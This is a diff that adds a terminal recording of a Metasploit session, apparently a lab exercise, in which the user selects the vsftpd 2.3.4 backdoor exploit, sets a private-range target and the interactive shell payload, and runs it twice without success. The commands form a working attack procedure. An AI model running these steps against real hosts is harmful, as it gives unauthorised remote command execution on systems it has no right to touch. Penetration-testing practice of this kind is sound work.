@@ -1,0 +1,66 @@
+Script started on 2025-10-23 04:30:29-04:00 [COMMAND="msfconsole -q" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="236" LINES="51"]
+[?1034h[4mmsf[0m [0m> search vsftpd
+[0m
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/[45mvsftpd[0m_232          2011-02-03       normal     Yes    [45mVSFTPD[0m 2.3.2 Denial of Service
+   1  exploit/unix/ftp/[45mvsftpd[0m_234_backdoor  2011-07-03       [32mexcellent[0m  No     [45mVSFTPD[0m v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example [32minfo 1[0m, [32muse 1[0m or [32muse exploit/unix/ftp/vsftpd_234_backdoor[0m
+
+[4mmsf[0m [0m> use exploit/unix/ftp/vsftpd_234_backdoor
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> showb[K pa[K[Koptions
+[0m
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the [32minfo[0m, or [32minfo -d[0m command.
+
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set RHOSTS 192.168.239.255
+[0mRHOSTS => 192.168.239.255
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> show payload
+[0m[1m[31m[-][0m Invalid parameter "payload", use "show -h" for more information
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> show payloads
+[0m
+Compatible Payloads
+===================
+
+   #  Name                       Disclosure Date  Rank    Check  Description
+   -  ----                       ---------------  ----    -----  -----------
+   0  payload/cmd/unix/interact  .                normal  No     Unix Command, Interact with Established Connection
+
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set payloads payload/cmd/unix/interact
+[0m[1m[33m[!][0m Unknown datastore option: payloads. Did you mean PAYLOAD?
+payloads => payload/cmd/unix/interact
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> set payloads payload/cmd/unix/interact[P payload/cmd/unix/interact[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+[0mpayload => cmd/unix/interact
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exploit
+[0m[1m[31m[-][0m 192.168.239.255:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.239.255:21).
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exploit
+[0m[1m[31m[-][0m 192.168.239.255:21 - Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.239.255:21).
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf[0m exploit([1m[31munix/ftp/vsftpd_234_backdoor[0m) [0m> exit
+[0m
+Script done on 2025-10-23 04:34:00-04:00 [COMMAND_EXIT_CODE="0"]
